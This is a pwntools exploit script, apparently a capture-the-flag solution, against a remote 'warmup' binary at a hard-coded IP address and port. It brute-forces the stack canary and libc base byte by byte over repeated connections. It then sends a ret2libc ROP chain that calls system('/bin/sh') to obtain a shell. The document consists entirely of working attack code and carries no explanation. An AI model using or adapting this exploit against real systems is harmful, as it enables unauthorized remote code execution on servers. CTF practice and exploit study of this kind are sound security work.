from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./warmup")
libc = elf.libc

gdbscript = """
c
"""

p = remote("34.76.152.107", 17012)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript, aslr=False, setuid=False)


def brute_libc(payload):
    guess = b"\x76"

    for i in range(6):
        for can in range(0, 0x100):
            print(f"\r\rTrying: {can}", end='')
            r = remote(HOST, PORT)
            r.send(payload + guess + pack(can, 'all'))
            data = r.recvrepeat(timeout=10)
            if b"This is helper for you" in data:
                print(f"\n[+] Libc guess: {hex(unpack(guess, 'all'))}")
                r.close()
                guess += pack(can ,'all')
                break
            r.close()

    return unpack(guess, 'all')


def brute_canary(payload):
    guess = b""

    for i in range(8):
        for can in range(0, 0x100):
            print(f"\r\rTrying: {can}", end='')
            r = remote(HOST, PORT)
            r.send(payload + guess + pack(can, 'all'))
            data = r.recvrepeat(timeout=10)
            if b"*** stack smashing detected ***" not in data:
                print(f"\n[+] Canary guess: {hex(unpack(guess, 'all'))}")
                r.close()
                guess += pack(can ,'all')
                break
            r.close()

    return unpack(guess, 'all')


p.recvuntil(b"This challenge will run at port ")
PORT = int(p.recvline().strip())
# PORT = 8008
HOST = "34.76.152.107"

offset = 56
payload = b"A" * offset
canary = brute_canary(payload)
print(f"[+] Canary: {hex(canary)}")

payload += p64(canary) + p64(0xbaddad)
libc.address = brute_libc(payload) - 0x23a76
print(f"[+] Libc: {hex(libc.address)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])

r = remote(HOST, PORT)
r.send(payload)
